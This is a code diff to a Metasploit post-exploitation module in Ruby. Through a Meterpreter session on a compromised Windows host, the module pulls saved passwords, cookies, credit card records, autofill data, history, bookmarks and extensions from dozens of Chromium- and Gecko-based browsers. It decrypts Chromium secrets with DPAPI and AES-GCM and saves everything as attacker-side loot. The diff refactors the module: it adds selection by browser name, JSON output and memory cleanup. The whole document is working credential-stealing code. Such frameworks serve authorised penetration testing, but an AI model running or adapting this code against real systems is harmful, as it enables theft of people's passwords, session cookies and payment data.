@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Post
     register_options([
       OptBool.new('KILL_BROWSER', [false, 'Kill browser processes before extracting data.', false]),
       OptBool.new('USER_MIGRATION', [false, 'Migrate to explorer.exe running under user context before extraction.', false]),
-      OptEnum.new('BROWSER_TYPE', [true, 'Specify which browser type to extract data from.', 'all', ['all', 'chromium', 'gecko']]),
+      OptString.new('BROWSER_TYPE', [true, 'Specify which browser to extract data from. Accepts "all" to process all browsers, "chromium" for Chromium-based browsers, "gecko" for Gecko-based browsers, or a specific browser name (e.g., "chrome", "edge", "firefox").', 'all']),
       OptBool.new('EXTRACT_CACHE', [false, 'Extract browser cache (may take a long time). It is recommended to set "KILL_BROWSER" to "true" for best results, as this prevents file access issues.', false])
     ])
   end
@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Post
       if datastore['USER_MIGRATION']
         migrate_to_explorer
       else
-        print_error('Session is running with SYSTEM privileges. Enable USER_MIGRATION to run under a user context.')
+        print_error('Session is running as SYSTEM. Use the Meterpreter migrate command or set USER_MIGRATION to true to switch to a user context.')
         return
       end
     end
@@ -77,14 +77,16 @@ class MetasploitModule < Msf::Post
     print_status("Starting data extraction from user profile: #{user_profile}")
     print_status('')
 
-    case datastore['BROWSER_TYPE']
+    case datastore['BROWSER_TYPE'].downcase
     when 'chromium'
       process_chromium_browsers(user_profile)
     when 'gecko'
       process_gecko_browsers(user_profile)
-    else
+    when 'all'
       process_chromium_browsers(user_profile)
       process_gecko_browsers(user_profile)
+    else
+      process_specific_browser(user_profile, datastore['BROWSER_TYPE'])
     end
   end
 
@@ -112,9 +114,8 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
-  def process_chromium_browsers(base_path)
-    chromium_browsers = {
+  def chromium_browsers
+    {
       'Microsoft\\Edge\\' => 'Microsoft Edge',
       'Google\\Chrome\\' => 'Google Chrome',
       'Opera Software\\Opera Stable' => 'Opera',
@@ -144,21 +145,67 @@ class MetasploitModule < Msf::Post
       'Coowon\\Coowon\\' => 'Coowon',
       'Vivaldi\\' => 'Vivaldi'
     }
+  end
+
+  def gecko_browsers
+    {
+      'Mozilla\\Firefox\\' => 'Mozilla Firefox',
+      'Thunderbird\\' => 'Thunderbird',
+      'Mozilla\\SeaMonkey\\' => 'SeaMonkey',
+      'NETGATE Technologies\\BlackHawk\\' => 'BlackHawk',
+      '8pecxstudios\\Cyberfox\\' => 'Cyberfox',
+      'K-Meleon\\' => 'K-Meleon',
+      'Mozilla\\icecat\\' => 'Icecat',
+      'Moonchild Productions\\Pale Moon\\' => 'Pale Moon',
+      'Comodo\\IceDragon\\' => 'Comodo IceDragon',
+      'Waterfox\\' => 'Waterfox',
+      'Postbox\\' => 'Postbox',
+      'Flock\\Browser\\' => 'Flock Browser'
+    }
+  end
+
+  def process_specific_browser(user_profile, browser_type)
+    found = false
+    browser_type_downcase = browser_type.downcase
 
     chromium_browsers.each do |path, name|
+      next unless name.downcase.include?(browser_type_downcase)
+
+      print_status("Processing Chromium-based browser: #{name}")
+      process_chromium_browsers(user_profile, { path => name })
+      found = true
+      break
+    end
+
+    gecko_browsers.each do |path, name|
+      next unless name.downcase.include?(browser_type_downcase)
+
+      print_status("Processing Gecko-based browser: #{name}")
+      process_gecko_browsers(user_profile, { path => name })
+      found = true
+      break
+    end
+
+    unless found
+      print_error("No browser matching '#{browser_type}' found.")
+    end
+  end
+
+  def process_chromium_browsers(user_profile, browsers = chromium_browsers)
+    browsers.each do |path, name|
       if name == 'Opera'
-        profile_path = "#{base_path}\\AppData\\Roaming\\#{path}\\Default"
-        local_state = "#{base_path}\\AppData\\Roaming\\#{path}\\Local State"
+        profile_path = "#{user_profile}\\AppData\\Roaming\\#{path}\\Default"
+        local_state = "#{user_profile}\\AppData\\Roaming\\#{path}\\Local State"
       else
-        profile_path = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Default"
-        browser_version_path = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Last Version"
-        local_state = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Local State"
+        profile_path = "#{user_profile}\\AppData\\Local\\#{path}\\User Data\\Default"
+        browser_version_path = "#{user_profile}\\AppData\\Local\\#{path}\\User Data\\Last Version"
+        local_state = "#{user_profile}\\AppData\\Local\\#{path}\\User Data\\Local State"
       end
 
       next unless directory?(profile_path)
 
       browser_version = get_chromium_version(browser_version_path)
-      print_status("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
+      print_good("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
 
       kill_browser_process(name) if datastore['KILL_BROWSER']
 
@@ -180,25 +227,9 @@ class MetasploitModule < Msf::Post
     nil
   end
 
-  # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
-  def process_gecko_browsers(base_path)
-    gecko_browsers = {
-      'Mozilla\\Firefox\\' => 'Mozilla Firefox',
-      'Thunderbird\\' => 'Thunderbird',
-      'Mozilla\\SeaMonkey\\' => 'SeaMonkey',
-      'NETGATE Technologies\\BlackHawk\\' => 'BlackHawk',
-      '8pecxstudios\\Cyberfox\\' => 'Cyberfox',
-      'K-Meleon\\' => 'K-Meleon',
-      'Mozilla\\icecat\\' => 'Icecat',
-      'Moonchild Productions\\Pale Moon\\' => 'Pale Moon',
-      'Comodo\\IceDragon\\' => 'Comodo IceDragon',
-      'Waterfox\\' => 'Waterfox',
-      'Postbox\\' => 'Postbox',
-      'Flock\\Browser\\' => 'Flock Browser'
-    }
-
-    gecko_browsers.each do |path, name|
-      profile_path = "#{base_path}\\AppData\\Roaming\\#{path}\\Profiles"
+  def process_gecko_browsers(user_profile, browsers = gecko_browsers)
+    browsers.each do |path, name|
+      profile_path = "#{user_profile}\\AppData\\Roaming\\#{path}\\Profiles"
       next unless directory?(profile_path)
 
       found_browser = false
@@ -209,8 +240,8 @@ class MetasploitModule < Msf::Post
         prefs_file = "#{profile_path}\\#{profile_dir}\\prefs.js"
         browser_version = get_gecko_version(prefs_file)
 
-        if !found_browser
-          print_status("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
+        unless found_browser
+          print_good("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
           found_browser = true
         end
 
@@ -287,7 +318,7 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_chromium_data(encrypted_data)
-    print_status('Starting DPAPI decryption process.') if datastore['VERBOSE']
+    vprint_status('Starting DPAPI decryption process.')
     begin
       mem = session.railgun.kernel32.LocalAlloc(0, encrypted_data.length)['return']
       raise 'Memory allocation failed.' if mem == 0
@@ -309,18 +340,19 @@ class MetasploitModule < Msf::Post
       len, addr = ret['pDataOut'].unpack(inout_fmt)
       decrypted_data = len == 0 ? nil : session.railgun.memread(addr, len)
 
-      session.railgun.kernel32.LocalFree(mem)
-      session.railgun.kernel32.LocalFree(addr) if addr != 0
-      print_good('Decryption successful.') if datastore['VERBOSE']
+      vprint_good('Decryption successful.')
       return decrypted_data.strip
     rescue StandardError => e
-      print_error("Error during DPAPI decryption: #{e.message}") if datastore['VERBOSE']
+      vprint_error("Error during DPAPI decryption: #{e.message}")
       return nil
+    ensure
+      session.railgun.kernel32.LocalFree(mem) if mem != 0
+      session.railgun.kernel32.LocalFree(addr) if addr != 0
     end
   end
 
   def get_chromium_encryption_key(local_state_path)
-    print_status("Getting encryption key from: #{local_state_path}") if datastore['VERBOSE']
+    vprint_status("Getting encryption key from: #{local_state_path}")
     if file?(local_state_path)
       local_state = read_file(local_state_path)
       json_state = begin
@@ -345,19 +377,19 @@ class MetasploitModule < Msf::Post
           return nil
         end
 
-        print_status("Encrypted key (Base64-decoded, hex): #{encrypted_key_bin.unpack('H*').first}") if datastore['VERBOSE']
+        vprint_status("Encrypted key (Base64-decoded, hex): #{encrypted_key_bin.unpack('H*').first}")
         decrypted_key = decrypt_chromium_data(encrypted_key_bin)
 
         if decrypted_key.nil? || decrypted_key.length != 32
-          print_error("Decrypted key is not 32 bytes: #{decrypted_key.nil? ? 'nil' : decrypted_key.length} bytes") if datastore['VERBOSE']
+          vprint_error("Decrypted key is not 32 bytes: #{decrypted_key.nil? ? 'nil' : decrypted_key.length} bytes")
           if decrypted_key.length == 31
-            print_status('Decrypted key is 31 bytes, attempting to pad key for decryption.') if datastore['VERBOSE']
+            vprint_status('Decrypted key is 31 bytes, attempting to pad key for decryption.')
             decrypted_key += "\x00"
           else
             return nil
           end
         end
-        print_good("Decrypted key (hex): #{decrypted_key.unpack('H*').first}") if datastore['VERBOSE']
+        vprint_good("Decrypted key (hex): #{decrypted_key.unpack('H*').first}")
         return decrypted_key
       else
         print_error('os_crypt or encrypted_key not found in Local State.')
@@ -377,14 +409,14 @@ class MetasploitModule < Msf::Post
     # https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
     if encrypted_password[0, 3] == 'v20'
       unless @app_bound_encryption_detected
-        print_status('Detected entries using App-Bound encryption (v20). These entries will not be decrypted.') if datastore['VERBOSE']
+        vprint_status('Detected entries using App-Bound encryption (v20). These entries will not be decrypted.')
         @app_bound_encryption_detected = true
       end
       return nil
     end
 
     if encrypted_password.nil? || encrypted_password.length < (IV_SIZE + TAG_SIZE + 3)
-      print_error('Invalid encrypted password length.') if datastore['VERBOSE']
+      vprint_error('Invalid encrypted password length.')
       return nil
     end
 
@@ -393,7 +425,7 @@ class MetasploitModule < Msf::Post
     tag = encrypted_password[-TAG_SIZE..]
 
     if iv.nil? || iv.length != IV_SIZE
-      print_error("Invalid IV: expected #{IV_SIZE} bytes, got #{iv.nil? ? 'nil' : iv.length} bytes") if datastore['VERBOSE']
+      vprint_error("Invalid IV: expected #{IV_SIZE} bytes, got #{iv.nil? ? 'nil' : iv.length} bytes")
       return nil
     end
 
@@ -407,7 +439,7 @@ class MetasploitModule < Msf::Post
       return decrypted_password
     rescue OpenSSL::Cipher::CipherError
       unless @password_decryption_failed
-        print_status('Password decryption failed for one or more entries. These entries could not be decrypted.') if datastore['VERBOSE']
+        vprint_status('Password decryption failed for one or more entries. These entries could not be decrypted.')
         @password_decryption_failed = true
       end
       return nil
@@ -432,8 +464,8 @@ class MetasploitModule < Msf::Post
     login_data_path = "#{profile_path}\\Login Data"
     if file?(login_data_path)
       extract_sql_data(login_data_path, 'SELECT origin_url, username_value, password_value FROM logins', 'Passwords', browser, encryption_key)
-    elsif datastore['VERBOSE']
-      print_error("Passwords not found at #{login_data_path}")
+    else
+      vprint_error("Passwords not found at #{login_data_path}")
     end
   end
 
@@ -449,8 +481,8 @@ class MetasploitModule < Msf::Post
           print_error("An error occurred while extracting cookies: #{e.message}")
         end
       end
-    elsif datastore['VERBOSE']
-      print_error("Cookies not found at #{cookies_path}")
+    else
+      vprint_error("Cookies not found at #{cookies_path}")
     end
   end
 
@@ -458,8 +490,8 @@ class MetasploitModule < Msf::Post
     credit_card_data_path = "#{profile_path}\\Web Data"
     if file?(credit_card_data_path)
       extract_sql_data(credit_card_data_path, 'SELECT * FROM credit_cards', 'Credit Cards', browser, encryption_key)
-    elsif datastore['VERBOSE']
-      print_error("Credit Cards not found at #{credit_card_data_path}")
+    else
+      vprint_error("Credit Cards not found at #{credit_card_data_path}")
     end
   end
 
@@ -467,8 +499,8 @@ class MetasploitModule < Msf::Post
     download_history_path = "#{profile_path}\\History"
     if file?(download_history_path)
       extract_sql_data(download_history_path, 'SELECT * FROM downloads', 'Download History', browser)
-    elsif datastore['VERBOSE']
-      print_error("Download History not found at #{download_history_path}")
+    else
+      vprint_error("Download History not found at #{download_history_path}")
     end
   end
 
@@ -476,8 +508,8 @@ class MetasploitModule < Msf::Post
     autofill_data_path = "#{profile_path}\\Web Data"
     if file?(autofill_data_path)
       extract_sql_data(autofill_data_path, 'SELECT * FROM autofill', 'Autofill Data', browser)
-    elsif datastore['VERBOSE']
-      print_error("Autofill data not found at #{autofill_data_path}")
+    else
+      vprint_error("Autofill data not found at #{autofill_data_path}")
     end
   end
 
@@ -485,8 +517,8 @@ class MetasploitModule < Msf::Post
     keyword_search_history_path = "#{profile_path}\\History"
     if file?(keyword_search_history_path)
       extract_sql_data(keyword_search_history_path, 'SELECT term FROM keyword_search_terms', 'Keyword Search History', browser)
-    elsif datastore['VERBOSE']
-      print_error("Keyword Search History not found at #{keyword_search_history_path}")
+    else
+      vprint_error("Keyword Search History not found at #{keyword_search_history_path}")
     end
   end
 
@@ -494,8 +526,8 @@ class MetasploitModule < Msf::Post
     browsing_history_path = "#{profile_path}\\History"
     if file?(browsing_history_path)
       extract_sql_data(browsing_history_path, 'SELECT url, title, visit_count, last_visit_time FROM urls', 'Browsing History', browser)
-    elsif datastore['VERBOSE']
-      print_error("Browsing History not found at #{browsing_history_path}")
+    else
+      vprint_error("Browsing History not found at #{browsing_history_path}")
     end
   end
 
@@ -514,15 +546,16 @@ class MetasploitModule < Msf::Post
       traverse_and_collect_bookmarks(bookmarks_json['roots']['other'], bookmarks)
     end
 
-    browser_clean = browser.gsub('\\', '_').chomp('_')
-    timestamp = Time.now.strftime('%Y%m%d%H%M')
-    ip = session.sock.peerhost
-
     if bookmarks.any?
-      bookmark_entries = bookmarks.map { |bookmark| "#{bookmark[:name]}: #{bookmark[:url]}" }.join("\n")
-      file_name = store_loot("#{browser_clean}_Bookmarks", 'text/plain', session, bookmark_entries, "#{timestamp}_#{ip}_#{browser_clean}_Bookmarks.txt", "#{browser_clean} Bookmarks")
-      file_size = ::File.size(file_name)
-      print_good("└ Extracted Bookmarks to #{file_name} (#{file_size} bytes)")
+      browser_clean = browser.gsub('\\', '_').chomp('_')
+      timestamp = Time.now.strftime('%Y%m%d%H%M')
+      ip = session.sock.peerhost
+      bookmark_entries = JSON.pretty_generate(bookmarks)
+      file_name = store_loot("#{browser_clean}_Bookmarks", 'application/json', session, bookmark_entries, "#{timestamp}_#{ip}_#{browser_clean}_Bookmarks.json", "#{browser_clean} Bookmarks")
+
+      print_good("└ Bookmarks extracted to #{file_name} (#{bookmarks.length} entries)")
+    else
+      vprint_error("No bookmarks found for #{browser}.")
     end
   end
 
@@ -542,7 +575,7 @@ class MetasploitModule < Msf::Post
     extensions_dir = "#{profile_path}\\Extensions\\"
     return unless directory?(extensions_dir)
 
-    extension_data = ''
+    extensions = []
     session.fs.dir.entries(extensions_dir).each do |extension_id|
       extension_path = "#{extensions_dir}\\#{extension_id}"
       next unless directory?(extension_path)
@@ -563,18 +596,18 @@ class MetasploitModule < Msf::Post
           extension_name = resolve_chromium_extension_name(extension_path, extension_name, version_folder)
         end
 
-        extension_data += "Name: #{extension_name}\nVersion: #{extension_version}\n\n"
+        extensions << { 'name' => extension_name, 'version' => extension_version }
       end
     end
 
-    unless extension_data.strip.empty?
+    if extensions.any?
       browser_clean = browser.gsub('\\', '_').chomp('_')
       timestamp = Time.now.strftime('%Y%m%d%H%M')
       ip = session.sock.peerhost
-
-      file_name = store_loot("#{browser_clean}_Extensions", 'text/plain', session, extension_data, "#{timestamp}_#{ip}_#{browser_clean}_Extensions.txt", "#{browser_clean} Extensions")
-      file_size = ::File.size(file_name)
-      print_good("└ Extracted Extensions to #{file_name} (#{file_size} bytes)")
+      file_name = store_loot("#{browser_clean}_Extensions", 'application/json', session, "#{JSON.pretty_generate(extensions)}\n", "#{timestamp}_#{ip}_#{browser_clean}_Extensions.json", "#{browser_clean} Extensions")
+      print_good("└ Extensions extracted to #{file_name} (#{extensions.count} entries)")
+    else
+      vprint_error("No extensions found for #{browser}.")
     end
   end
 
@@ -684,11 +717,11 @@ class MetasploitModule < Msf::Post
       )
 
       file_size = ::File.size(cache_local_path)
-      print_good("└ Extracted Cache to #{cache_local_path} (#{file_size} bytes)") if file_size > 2
+      print_good("└ Cache extracted to #{cache_local_path} (#{file_size} bytes)") if file_size > 2
 
       session.fs.file.rm(zip_file_path)
     else
-      print_status("No Cache files found for #{browser}.")
+      vprint_status("No Cache files found for #{browser}.")
     end
   end
 
@@ -706,22 +739,27 @@ class MetasploitModule < Msf::Post
     logins_path = "#{profile_path}\\logins.json"
     return unless file?(logins_path)
 
-    json_data = read_file(logins_path)
-    browser_clean = browser.gsub('\\', '_').chomp('_')
-    timestamp = Time.now.strftime('%Y%m%d%H%M')
-    ip = session.sock.peerhost
-    file_name = store_loot("#{browser_clean}_Passwords", 'application/json', session, json_data, "#{timestamp}_#{ip}_#{browser_clean}_Passwords.json", "#{browser_clean} Passwords")
-    file_size = ::File.size(file_name)
+    logins_data = read_file(logins_path)
+    logins_json = JSON.parse(logins_data)
 
-    print_good("└ Extracted Passwords to #{file_name} (#{file_size} bytes)") if file_size > 2
+    if logins_json['logins'].any?
+      browser_clean = browser.gsub('\\', '_').chomp('_')
+      timestamp = Time.now.strftime('%Y%m%d%H%M')
+      ip = session.sock.peerhost
+      file_name = store_loot("#{browser_clean}_Passwords", 'application/json', session, "#{JSON.pretty_generate(logins_json)}\n", "#{timestamp}_#{ip}_#{browser_clean}_Passwords.json", "#{browser_clean} Passwords")
+
+      print_good("└ Passwords extracted to #{file_name} (#{logins_json['logins'].length} entries)")
+    else
+      vprint_error("No passwords found for #{browser}.")
+    end
   end
 
   def process_gecko_cookies(profile_path, browser)
     cookies_path = "#{profile_path}\\cookies.sqlite"
     if file?(cookies_path)
       extract_sql_data(cookies_path, 'SELECT host, name, path, value, expiry FROM moz_cookies', 'Cookies', browser)
-    elsif datastore['VERBOSE']
-      print_error("Cookies not found at #{cookies_path}")
+    else
+      vprint_error("Cookies not found at #{cookies_path}")
     end
   end
 
@@ -729,8 +767,8 @@ class MetasploitModule < Msf::Post
     download_history_path = "#{profile_path}\\places.sqlite"
     if file?(download_history_path)
       extract_sql_data(download_history_path, 'SELECT place_id, GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id', 'Download History', browser)
-    elsif datastore['VERBOSE']
-      print_error("Download History not found at #{download_history_path}")
+    else
+      vprint_error("Download History not found at #{download_history_path}")
     end
   end
 
@@ -738,8 +776,8 @@ class MetasploitModule < Msf::Post
     keyword_search_history_path = "#{profile_path}\\formhistory.sqlite"
     if file?(keyword_search_history_path)
       extract_sql_data(keyword_search_history_path, 'SELECT value FROM moz_formhistory', 'Keyword Search History', browser)
-    elsif datastore['VERBOSE']
-      print_error("Keyword Search History not found at #{keyword_search_history_path}")
+    else
+      vprint_error("Keyword Search History not found at #{keyword_search_history_path}")
     end
   end
 
@@ -747,8 +785,8 @@ class MetasploitModule < Msf::Post
     browsing_history_path = "#{profile_path}\\places.sqlite"
     if file?(browsing_history_path)
       extract_sql_data(browsing_history_path, 'SELECT url, title, visit_count, last_visit_date FROM moz_places', 'Browsing History', browser)
-    elsif datastore['VERBOSE']
-      print_error("Browsing History not found at #{browsing_history_path}")
+    else
+      vprint_error("Browsing History not found at #{browsing_history_path}")
     end
   end
 
@@ -756,8 +794,8 @@ class MetasploitModule < Msf::Post
     bookmarks_path = "#{profile_path}\\places.sqlite"
     if file?(bookmarks_path)
       extract_sql_data(bookmarks_path, 'SELECT moz_bookmarks.title AS title, moz_places.url AS url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id', 'Bookmarks', browser)
-    elsif datastore['VERBOSE']
-      print_error("Bookmarks not found at #{bookmarks_path}")
+    else
+      vprint_error("Bookmarks not found at #{bookmarks_path}")
     end
   end
 
@@ -768,25 +806,25 @@ class MetasploitModule < Msf::Post
     addons_data = read_file(addons_path)
     addons_json = JSON.parse(addons_data)
 
-    extension_data = ''
+    extensions = []
 
     if addons_json['addons']
       addons_json['addons'].each do |addon|
         extension_name = addon['name']
         extension_version = addon['version']
-
-        extension_data += "Name: #{extension_name}\nVersion: #{extension_version}\n\n"
+        extensions << { 'name' => extension_name, 'version' => extension_version }
       end
     end
 
-    unless extension_data.strip.empty?
+    if extensions.any?
       browser_clean = browser.gsub('\\', '_').chomp('_')
       timestamp = Time.now.strftime('%Y%m%d%H%M')
       ip = session.sock.peerhost
+      file_name = store_loot("#{browser_clean}_Extensions", 'application/json', session, "#{JSON.pretty_generate(extensions)}\n", "#{timestamp}_#{ip}_#{browser_clean}_Extensions.json", "#{browser_clean} Extensions")
 
-      file_name = store_loot("#{browser_clean}_Extensions", 'text/plain', session, extension_data, "#{timestamp}_#{ip}_#{browser_clean}_Extensions.txt", "#{browser_clean} Extensions")
-      file_size = ::File.size(file_name)
-      print_good("└ Extracted Extensions to #{file_name} (#{file_size} bytes)")
+      print_good("└ Extensions extracted to #{file_name} (#{extensions.length} entries)")
+    else
+      vprint_error("No extensions found for #{browser}.")
     end
   end
 
@@ -848,11 +886,11 @@ class MetasploitModule < Msf::Post
       )
 
       file_size = ::File.size(cache_local_path)
-      print_good("└ Extracted Cache to #{cache_local_path} (#{file_size} bytes)") if file_size > 2
+      print_good("└ Cache extracted to #{cache_local_path} (#{file_size} bytes)") if file_size > 2
 
       session.fs.file.rm(zip_file_path)
     else
-      print_status("No Cache files found for #{browser}.")
+      vprint_status("No Cache files found for #{browser}.")
     end
   end
 
@@ -862,8 +900,9 @@ class MetasploitModule < Msf::Post
       session.fs.file.download_file(db_local_path, db_path)
 
       begin
-        db = SQLite3::Database.open(db_local_path)
-        result = db.execute(query)
+        columns, *result = SQLite3::Database.open(db_local_path) do |db|
+          db.execute2(query)
+        end
 
         if encryption_key
           result.each do |row|
@@ -877,17 +916,19 @@ class MetasploitModule < Msf::Post
           end
         end
 
-        browser_clean = browser.gsub('\\', '_').chomp('_')
-        timestamp = Time.now.strftime('%Y%m%d%H%M')
-        ip = session.sock.peerhost
-        file_name = store_loot("#{browser_clean}_#{data_type}", 'text/plain', session, result, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.txt", "#{browser_clean} #{data_type.capitalize}")
-        file_size = ::File.size(file_name)
+        if result.any?
+          browser_clean = browser.gsub('\\', '_').chomp('_')
+          timestamp = Time.now.strftime('%Y%m%d%H%M')
+          ip = session.sock.peerhost
+          result = result.map { |row| columns.zip(row).to_h }
+          data = "#{JSON.pretty_generate(result)}\n"
+          file_name = store_loot("#{browser_clean}_#{data_type}", 'application/json', session, data, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.json", "#{browser_clean} #{data_type.capitalize}")
 
-        if file_size > 2
-          print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
+          print_good("└ #{data_type.capitalize} extracted to #{file_name} (#{result.length} entries)")
+        else
+          vprint_error("└ #{data_type.capitalize} empty")
         end
       ensure
-        db.close
         ::File.delete(db_local_path) if ::File.exist?(db_local_path)
       end
     end
